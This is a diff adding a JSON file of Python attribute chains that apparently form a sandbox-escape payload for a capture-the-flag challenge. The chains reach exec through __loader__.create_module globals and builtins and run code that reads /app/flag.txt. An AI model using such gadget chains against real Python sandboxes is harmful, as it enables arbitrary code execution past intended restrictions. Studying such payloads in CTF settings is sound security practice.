@@ -1,0 +1,10 @@
+[
+  [
+    ["__loader__", "create_module", "__globals__", ["_path_isdir"]],
+    ["__loader__", "create_module", "__builtins__", ["exec"]]
+  ],
+  [
+    ["__loader__", "create_module", "__globals__", ["sys"], "path", [0]],
+    ["__dict__", "__class__", ["print(open('/app/flag.txt').read())"], "__args__", [0]]
+  ]
+]
